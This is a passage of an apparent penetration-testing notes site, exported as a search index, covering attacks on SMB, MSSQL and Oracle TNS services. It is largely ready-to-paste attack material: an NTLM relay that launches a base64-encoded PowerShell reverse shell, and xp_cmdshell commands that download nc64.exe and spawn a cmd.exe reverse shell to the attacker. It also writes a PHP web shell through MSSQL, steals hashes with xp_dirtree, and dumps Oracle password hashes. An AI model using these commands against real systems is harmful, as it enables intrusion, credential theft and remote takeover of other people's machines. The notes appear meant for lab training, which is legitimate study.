attack","text":"<p>If we capture the hash but cannot crack it, then we can try a NTLM relay attack with impacket-ntlmrelayx or Responder MultiRelay.py.</p> <p>Step 1: Set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).</p> <pre><code>cat /etc/responder/Responder.conf | grep 'SMB ='\n</code></pre> <p>Step 2: Launch proxy and get SAM database. By default,\u00a0<code>impacket-ntlmrelayx</code>\u00a0will dump the SAM database, but we can execute commands by adding the option\u00a0<code>-c</code>.</p> <pre><code># impacket-ntlmrelayx will dump the SAM database by default\nimpacket-ntlmrelayx --no-http-server -smb2support -t $ip\n# --no-http-server:\n#  -smb2support: \n# -t: target machine\n</code></pre> <p>Step 3:  Create a PowerShell reverse shell using\u00a0https://www.revshells.com/</p> <pre><code># Use option to encode it in base 64\npowershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA\n</code></pre> <p>Step 4: Use the captured hash to launch a reverse shell. Commands in impacket-ntlmrelayx can be executed with flag -c.</p> <pre><code> impacket-ntlmrelayx --no-http-server -smb2support -t $ip -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'\n</code></pre> <p>Step 5: Finally, launch a listener. Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.</p> <pre><code>nc  -lnvp 9002\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#9-smbghost","title":"9. SMBGhost","text":"<p>SMBGhost\u00a0with the\u00a0CVE-2020-0796.</p> <p>The vulnerability consisted of a compression mechanism of the version SMB v3.1.1 which made Windows 10 versions 1903 and 1909 vulnerable to attack by an unauthenticated attacker. The vulnerability allowed the attacker to gain remote code execution (<code>RCE</code>) and full access to the remote target system. In simple terms, this is an\u00a0integer overflow\u00a0vulnerability in a function of an SMB driver that allows system commands to be overwritten while accessing memory.</p> <p>POC: https://www.exploit-db.com/exploits/48537</p>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#interacting-with-smb-using-windows-linux","title":"Interacting with SMB using Windows &amp; Linux","text":"","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#windows","title":"Windows","text":"","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#using-the-explorer","title":"Using the explorer","text":"<p><code>[WINKEY] + [R]</code>\u00a0to open the Run dialog box and type the file share location, e.g.:\u00a0<code>\\\\$IP$\\Finance\\</code></p>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#using-cmd","title":"Using cmd","text":"<pre><code>net use n: \\\\$IP$\\Finance\n# n: map its content to the drive letter\u00a0`n`\n\n\n# Provide user and password\nnet use n: \\\\$IP$\\Finance /user:plaintext Password123\n\n# how many files the shared folder and its subdirectories contain.\ndir n: /a-d /s /b | find /c \":\\\"\n# dir   Application\n# n:    Directory or drive to search\n# /a-d  /a is the attribute and -d means not directories\n# /s    Displays files in a specified directory and all subdirectories\n# /b    Uses bare format (no heading information or summary)\n# | find /c \":\\\\\" :  count how many files exist in the directory and subdirectories\n\n# Return files that contain string \"cred\" in the name\ndir n:\\*cred* /s /b\n\n# Return files that contain string \"password\" within \nfindstr /s /i password n:\\*.*\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#using-powershell","title":"Using powershell","text":"<pre><code># List contents of folder Finance\nGet-ChildItem \\\\$IP$\\Finance\\\n\n# Connect to a share \nNew-PSDrive -Name \"N\" -Root \"\\\\$IP\\Finance\" -PSProvider \"FileSystem\"\n\n# To provide a username and password with Powershell, we need to create a PSCredential. It offers a centralized way to manage usernames, passwords, and credentials.\n$username = 'plaintext'\n$password = 'Password123'\n$secpassword = ConvertTo-SecureString $password -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword\nNew-PSDrive -Name \"N\" -Root \"\\\\$IP\\Finance\" -PSProvider \"FileSystem\" -Credential $cred\n\n# Count elements in a folder\n(Get-ChildItem -File -Recurse | Measure-Object).Count\n\n# Return files that contain string \"cred\" in the name\nGet-ChildItem -Recurse -Path N:\\ -Include *cred* -File\n\n# Return files that contain string \"password\" within \nGet-ChildItem -Recurse -Path N:\\ | Select-String \"password\" -List\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"137-138-139-445-smb/#linux","title":"Linux","text":"<pre><code># mount folder\nsudo mkdir /mnt/Finance\nsudo mount -t cifs -o username=plaintext,password=Password123,domain=. //$IP/Finance /mnt/Finance\n\n# As an alternative, we can use a credential file.\nmount -t cifs //$IP/Finance /mnt/Finance -o credentials=/path/credentialfile\n\n# The file credentialfile has to be structured like this:\n# username=plaintext\n# password=Password123\n# domain=.\n\n# Return files that contain string \"cred\" in the name  \nfind /mnt/Finance/ -name *cred*\n\n# Return files that contain string \"password\" within \ngrep -rn /mnt/Finance/ -ie password\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba"]},{"location":"1433-mssql/","title":"1433 msSQL","text":"<p>See msSQL.</p> Sources and resources <ul> <li>nc64.exe.</li> <li>Impacket: mssqlclient.py.  </li> <li>Pentesmonkey Cheat sheet.</li> <li>book.hacktricks.xyz.</li> <li>winPEAS.</li> </ul> <p>By default, MSSQL uses ports\u00a0<code>TCP/1433</code>\u00a0and\u00a0<code>UDP/1434</code>, and MySQL uses\u00a0<code>TCP/3306</code>. However, when MSSQL operates in a \"hidden\" mode, it uses the\u00a0<code>TCP/2433</code>\u00a0port. </p>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#enumeration","title":"Enumeration","text":"<p>Basic enumeration:</p> <pre><code>nmap -Pn -sV -sC -p1433 $ip\n</code></pre> <p>If you don't know anything about the service:</p> <pre><code>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip\n\nsudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip\n</code></pre> <p>We can also use Metasploit to run an auxiliary scanner called <code>mssql_ping</code> that will scan the MSSQL service and provide helpful information in our footprinting process.</p>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#mssql-ping-in-metasploit","title":"MSSQL Ping in Metasploit","text":"<pre><code>msf6 auxiliary(scanner/mssql/mssql_ping) &gt; set rhosts 10.129.201.248\n\nrhosts =&gt; 10.129.201.248\n\n\nmsf6 auxiliary(scanner/mssql/mssql_ping) &gt; run\n\n[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:\n[+] 10.129.201.248:       -    ServerName      = SQL-01\n[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER\n[+] 10.129.201.248:       -    IsClustered     = No\n[+] 10.129.201.248:       -    Version         = 15.0.2000.5\n[+] 10.129.201.248:       -    tcp             = 1433\n[+] 10.129.201.248:       -    np              = \\\\SQL-01\\pipe\\sql\\query\n[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#connect-to-database","title":"Connect to database:","text":"","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#from-linux","title":"From Linux","text":"","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#sqsh","title":"sqsh","text":"<pre><code># Targeting a local account:\nsqsh -S $ip -U &lt;username&gt; -P 'MyPassword!' -h\n\n# Targeting Windows authentication\nsqsh -S $ip -U .\\\\username -P 'MyPassword!' -h\n# -h: disable headers and footers for a cleaner look.\n</code></pre>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#mssqlclientpy-from-impacket","title":"mssqlclient.py from impacket","text":"<p>Alternatively, we can use the tool from Impacket with the name\u00a0<code>mssqlclient.py</code>.</p> <pre><code>mssqlclient.py -p $port username@$ip \n</code></pre> <p>If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (<code>Transact-SQL</code>). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.</p> <pre><code>python3 mssqlclient.py Administrator@$ip -windows-auth  \n# With python3 mssqlclient.py help you can see more options.\n\n# Another example\nmssqlclient.py $domain/$user@$ip -windows-auth\n# Example:\n# mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth\n</code></pre>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#from-windows","title":"From Windows","text":"","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#sqlcmd","title":"sqlcmd","text":"<pre><code>sqlcmd -S &lt;server&gt; -U &lt;username&gt; -P 'MyPassword!' -y 30 -Y 30\n# When we authenticate to MSSQL using\u00a0`sqlcmd`\u00a0we can use the parameters\u00a0`-y`\u00a0(SQLCMDMAXVARTYPEWIDTH) and\u00a0`-Y`\u00a0(SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.\n</code></pre>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#from-gui-application","title":"From GUI Application","text":"","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#server-management-studio-or-ssms","title":"Server Management Studio or SSMS","text":"<p>Download from: SQL Server Management Studio or SSMS</p>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#dbeaver","title":"dbeaver","text":"<p>dbeaver\u00a0is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.</p> <p>To install\u00a0dbeaver\u00a0using a Debian package we can download the release .deb package from\u00a0https://github.com/dbeaver/dbeaver/releases\u00a0and execute the following command:</p> <pre><code>sudo dpkg -i dbeaver-&lt;version&gt;.deb\n\n# run dbeaver in a second plane\n dbeaver &amp;\n</code></pre>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#basic-mssql-commands","title":"Basic mssql commands","text":"<pre><code># Get Microsoft SQL server version\nselect @@version;\n\n# Get usernames\nselect user_name()\ngo \n\n# We need to use GO after our query to execute the SQL syntax. \n# List databases\nSELECT name FROM master.dbo.sysdatabases\ngo\n\n# Select a database\nUSE $dbName\ngo\n## Examples: Select a database master\n## USE master\n\n# Check out which one is the current selected database\nSELECT DB_NAME()\ngo\n\n# Show tables\nSELECT table_name FROM $dbName.INFORMATION_SCHEMA.TABLES\ngo\n\n# Select a database and show content of a specific table.  \nUSE $dbName\nSELECT * FROM $tableName \n\n# Example: Select all Data from Table \"users\". The name of the table (\"users\") was obtained when running the command for showing the tables.\nSELECT * FROM users\ngo\n\n# Get a list of users in the domain\nSELECT name FROM master..syslogins\ngo\n\n# Get a list of users that are sysadmins\nSELECT name FROM master..syslogins WHERE sysadmin = 1\ngo\n\n# And to make sure: \nSELECT is_srvrolemember('sysadmin')\ngo\n# If your user is admin, it will return 1.\n</code></pre> <p>Also, you might be interested in executing a cmd shell using xp_cmdshell by reconfiguring sp_configure (see the section <code>Executing cmd shell in a SQL command line</code>).</p>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#write-files-using-mssql","title":"Write files using MSSQL","text":"<p>To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:</p> <pre><code>sp_configure 'show advanced options', 1;\nRECONFIGURE;\nsp_configure 'Ole Automation Procedures', 1;\nRECONFIGURE;\n</code></pre>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#create-files-using-mssql","title":"Create files using MSSQL","text":"<pre><code># Using MSSQL to Create a File\nDECLARE @OLE INT;\nDECLARE @FileID INT;\nEXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;\nEXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\webshell.php', 8, 1;\nEXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&lt;?php echo shell_exec($_GET[\"c\"]);?&gt;';\nEXECUTE sp_OADestroy @FileID;\nEXECUTE sp_OADestroy @OLE;\n</code></pre>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#read-files-using-mssql","title":"Read files using MSSQL","text":"<pre><code>SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents\n</code></pre>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#attacks","title":"Attacks","text":"","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#executing-cmd-shell-in-a-sql-command-line","title":"Executing cmd shell in a SQL command line","text":"<p>Our goal can be to spawn a Windows command shell and pass in a string for execution. For that Microsoft SQL syntaxis has the command xp_cmdshell, that will allow us to use the SQL command line as a CLI. </p> <p>Because malicious users sometimes attempt to elevate their privileges by using xp_cmdshell, xp_cmdshell is disabled by default. \u00a0<code>xp_cmdshell</code>\u00a0can be enabled and disabled by using the\u00a0Policy-Based Management\u00a0or by executing\u00a0sp_configure</p> <p>sp_configure displays or changes global configuration settings for the current settings. This is how you may take advantage of it:</p> <pre><code># To allow advanced options to be changed.   \nEXECUTE sp_configure 'show advanced options', 1\ngo\n\n# To update the currently configured value for advanced options.  \nRECONFIGURE\ngo\n\n# To enable the feature.  \nEXECUTE sp_configure 'xp_cmdshell', 1\ngo\n\n# To update the currently configured value for this feature.  \nRECONFIGURE\ngo\n</code></pre> <p>Note:  The Windows process spawned by\u00a0<code>xp_cmdshell</code>\u00a0has the same security rights as the SQL Server service account</p> <p>Now we can use the MSSQL terminal to execute commands:</p> <pre><code># Who am i?\nxp_cmdshell 'whoami'\ngo\n\n# This will return the .exe files existing in the current directory\nEXEC xp_cmdshell 'dir *.exe'\ngo\n\n# To print a file\nEXECUTE xp_cmdshell 'type c:\\Users\\sql_svc\\Desktop\\user.txt\ngo\n\n# With this (and a \"python3 -m http.server 80\" from our kali serving a file) we can upload a file to the attacked machine, for instance a reverse shell like nc64.exe\nxp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; wget http://IPfromOurKali/nc64.exe -outfile nc64.exe\"\ngo\n\n# We could also bind this cmd.exe through the nc to our listener. For that open a different tab in kali and do a \"nc -lnvp 443\". When launching the reverse shell, we'll get a powershell terminal in this tab by running:\nxp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; .\\nc64.exe -e cmd.exe IPfromOurKali 443\";\n# You could also upload winPEAS and run it from this powershell command line\n</code></pre> <p>There are other methods to get command execution, such as adding\u00a0extended stored procedures,\u00a0CLR Assemblies,\u00a0SQL Server Agent Jobs, and\u00a0external scripts.</p>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#capture-mssql-service-hash","title":"Capture MSSQL Service Hash","text":"<p>We can steal the MSSQL service account hash using\u00a0<code>xp_subdirs</code>\u00a0or\u00a0<code>xp_dirtree</code>\u00a0undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.</p> <p>When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.</p> <p>1. First, start Responder or smbserver from impacket.</p> <p>2. Run:</p> <pre><code># For XP_DIRTREE Hash Stealing\nEXEC master..xp_dirtree '\\\\$KaliIP\\share\\'\n\n# For XP_SUBDIRS Hash Stealing\nEXEC master..xp_subdirs '\\\\$KaliIP\\share\\\n</code></pre> <p>If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.</p> <p>3. XP_SUBDIRS Hash Stealing with Responder</p> <pre><code>sudo responder -I tun0\n</code></pre> <p>4. XP_SUBDIRS Hash Stealing with impacket</p> <pre><code>sudo impacket-smbserver share ./ -smb2support\n</code></pre>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#impersonate-existing-users-with-mssql","title":"Impersonate Existing Users with MSSQL","text":"<p>SQL Server has a special permission, named <code>IMPERSONATE</code>, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends:</p> <p>Impersonating sysadmin:</p> <pre><code># Identify Users that we Can Impersonate\nSELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' \ngo\n\n# Verify if our current user has the sysadmin role:\nSELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\ngo\n#  value 0 indicates no sysadmin role, value 1 is sysadmin role\n</code></pre> <p>Impersonating sa user:</p> <pre><code>USE master\nEXECUTE AS LOGIN = 'sa'\nSELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\ngo\n</code></pre> <p>It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database.</p> <p>To revert the operation and return to our previous user</p> <pre><code>REVERT\ngo\n</code></pre>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#communicate-with-other-databases-with-mssql","title":"Communicate with Other Databases with MSSQL","text":"<p><code>MSSQL</code>\u00a0has a configuration option called\u00a0linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.</p> <p>If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance.</p> <pre><code># Identify linked Servers in MSSQL\nSELECT srvname, isremote FROM sysservers\ngo\n</code></pre> <pre><code>srvname                             isremote\n----------------------------------- --------\nDESKTOP-MFERMN4\\SQLEXPRESS          1\n10.0.0.12\\SQLEXPRESS                0\n\n\n# isremote, where 1 means is a remote server, and 0 is a linked server. \n</code></pre> <pre><code>#  Identify the user used for the connection and its privileges:\nEXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\\SQLEXPRESS]\ngo \n\n# The\u00a0[EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql)\u00a0statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).\n\n\n\nexecute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv];  \ngo\n</code></pre> <p>As\u00a0<code>sysadmin</code>, we control the SQL Server instance. We can read data from any database or execute system commands with\u00a0<code>xp_cmdshell</code>.</p> <p>If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).</p>","tags":["mssql","port 1433","impacket"]},{"location":"1433-mssql/#cve-2012-2122-for-mysql-56x","title":"CVE-2012-2122 for MySQL 5.6.x","text":"<p>In the past, there was a vulnerability\u00a0CVE-2012-2122\u00a0in\u00a0<code>MySQL 5.6.x</code>\u00a0servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the\u00a0<code>timing attack</code>\u00a0vulnerability existed in the way MySQL handled authentication attempts.</p> <p>In this timing attack, MySQL repeatedly attempts to authenticate to a server and measures the time it takes for the server to respond to each attempt. By measuring the time it takes the server to respond, we can determine when the correct password has been found, even if the server does not indicate success or failure. In the case of\u00a0<code>MySQL 5.6.x</code>, the server takes longer to respond to an incorrect password than to a correct one. Thus, if we repeatedly try to authenticate with the same incorrect password, we will eventually receive a response indicating that the correct password was found, even though it was not.</p>","tags":["mssql","port 1433","impacket"]},{"location":"1521-oracle-transparent-network-substrate/","title":"1521 - Oracle Transparent Network Substrate (TNS)","text":"<p>The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks.  TNS supports various networking protocols between Oracle databases and client applications, such as IPX/SPX and TCP/IP protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. </p> <p>Addittionaly, it supports IPv6 and SSL/TLS encryption, which make it suitable for Name resolution, Connection management, Load balancing, Security.</p> <p>Oracle TNS is often used with other Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, and many more:</p> <ul> <li>Oracle Enterprise Manager: tool for start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance.</li> </ul>","tags":["oracle tns","port 1521","port 162"]},{"location":"1521-oracle-transparent-network-substrate/#footprinting-oracle-tns","title":"Footprinting Oracle TNS","text":"<p>Let's now use nmap to scan the default Oracle TNS listener port:</p> <pre><code>sudo nmap -p1521 -sV $ip --open\n</code></pre>","tags":["oracle tns","port 1521","port 162"]},{"location":"1521-oracle-transparent-network-substrate/#enumerating-sids","title":"Enumerating SIDs","text":"<p>In Oracle relational databases, also known as Oracle RDBMS, there are System Identifiers (<code>SID</code>).</p> <p>System Identifiers (SID) are a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. An instance is a set of processes and memory structures that interact to manage the database's data. </p> <p>The client uses this SID to identify which database instance it wants to connect to. If there is not a SID in the request, then, the default value defined in the <code>tnsnames.ora</code> file is used.</p> <pre><code>sudo nmap -p1521 -sV $ip --open --script oracle-sid-brute\n</code></pre>","tags":["oracle tns","port 1521","port 162"]},{"location":"1521-oracle-transparent-network-substrate/#more-enumeration-with-odat","title":"More enumeration with ODAT","text":"<p>We can use the <code>odat.py</code>  from ODAT tool to retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations,...</p> <pre><code>/odat.py all -s $ip\n</code></pre> <p>Addittionaly, if you have sysdba admin rights, you might  upload a web shell to the target (more in odat)  </p>","tags":["oracle tns","port 1521","port 162"]},{"location":"1521-oracle-transparent-network-substrate/#connect-to-oracle-database-sqlplus","title":"Connect to Oracle database: sqlplus","text":"<p>If we manage to get some credentials we can connect to the Oracle TNS service with sqlplus.</p> <pre><code>sqlplus &lt;username&gt;/&lt;password&gt;@$ip/XE;\n# Whereas XE has been identified with Odat as a valid SID\n\nsqlplus &lt;username&gt;/&lt;password&gt;@$ip/XE as sysdba\n</code></pre> <p>In case of this error message ( sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory), there might be an issue with libraries. Possible solution:</p> <pre><code>sudo sh -c \"echo /usr/lib/oracle/12.2/client64/lib &gt; /etc/ld.so.conf.d/oracle-instantclient.conf\";sudo ldconfig\n</code></pre> <p>The System Database Admin  in an Oracle RDBMS is sysdba. If an user has more privileges that they should have we can try to exploit it as sysdba.</p> <pre><code>sqlplus &lt;user&gt;/&lt;password&gt;@$ip/XE as sysdba\n</code></pre>","tags":["oracle tns","port 1521","port 162"]},{"location":"1521-oracle-transparent-network-substrate/#upload-a-web-shell","title":"Upload a web shell","text":"<p>If we have sysdba admin rights, we might  upload a webshell to the target. This requires the server to run a webserver, and we need to know the exact location of the root directory for the webserver. However, these are typical default paths for webservers:</p> OS Path Linux <code>/var/www/html</code> Windows <code>C:\\inetpub\\wwwroot</code> <pre><code># 1. Create a non suspicious web shell \necho \"Oracle File Upload Test\" &gt; testing.txt\n\n# 2. Upload  the shell to linux (/var/www/html) or windows (C:\\\\inetpub\\\\wwwroot):\n./odat.py utlfile -s $ip -d XE -U &lt;user&gt; -P &lt;password&gt; --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt\n\n## 3. Test if the file upload approach worked with curl, or visit via browser.\ncurl -X GET http://$ip/testing.txt\n</code></pre>","tags":["oracle tns","port 1521","port 162"]},{"location":"1521-oracle-transparent-network-substrate/#oracle-basic-commands","title":"Oracle basic commands","text":"<pre><code># List all available tables in the current database\nselect table_name from all_tables;\n\n# Show the privileges of the current user\nselect * from user_role_privs;\n\n# If we have sysdba admin rights, we might:\n    ## 1. enumerate all databases\nselect * from user_role_privs;\n\n    ## 2. extract Password Hashes\nselect name, password from sys.user$;\n\n    ## 3. upload a web shell to the target. This requires the server to run a web server, and we need to know the exact location of the root directory for the webserver.\n    ## 1. Creating a non suspicious web shell \necho \"Oracle File Upload Test\" &gt; testing.txt\n    ## 2. Uploading the shell to linux (/var/www/html) or windows (C:\\\\inetpub\\\\wwwroot):\n./odat.py utlfile -s $ip -d XE -U &lt;user&gt; -P &lt;password&gt; --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt\n</code></pre>","tags":["oracle tns","port 1521","port 162"]},{"location":"1521-oracle-transparent-network-substrate/#how-does-oracle-tns-work","title":"How does Oracle 